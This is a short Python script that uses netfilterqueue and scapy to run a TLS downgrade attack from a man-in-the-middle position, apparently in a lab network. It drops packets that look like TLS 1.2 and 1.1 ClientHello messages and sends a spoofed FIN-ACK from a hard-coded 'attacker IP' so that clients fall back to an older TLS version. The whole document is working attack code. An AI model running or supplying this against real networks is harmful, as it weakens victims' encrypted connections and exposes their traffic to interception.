from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

# Handle each packet
def callback(pkt):
    ip = IP(pkt.get_payload())

    # Check if there's a payload
    if not ip.haslayer(Raw):
        pkt.accept()
    else:
        payload = ip["Raw"].load
        
        # Check if it is a Client Hello packet and if TLS version 1.2 or 1.1, in that case drop the packet 
        if re.search(b'\x16\x03\x03', payload, flags=0) or re.search(b'\x16\x03\x02', payload, flags=0):
            pkt.drop()

            # Send a FIN ACK packet with the attacker IP address to the server in order to close the connection and make the client downgrade the TLS version
            new_packet = IP(dst=ip.dst, src="172.16.0.3")/TCP(flags=0x11, sport=ip[TCP].sport, dport=ip[TCP].dport, seq=ip[TCP].seq, ack=ip[TCP].ack)
            send(new_packet)
            
        else:
            pkt.accept()


# Starting looking at the traffic
nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
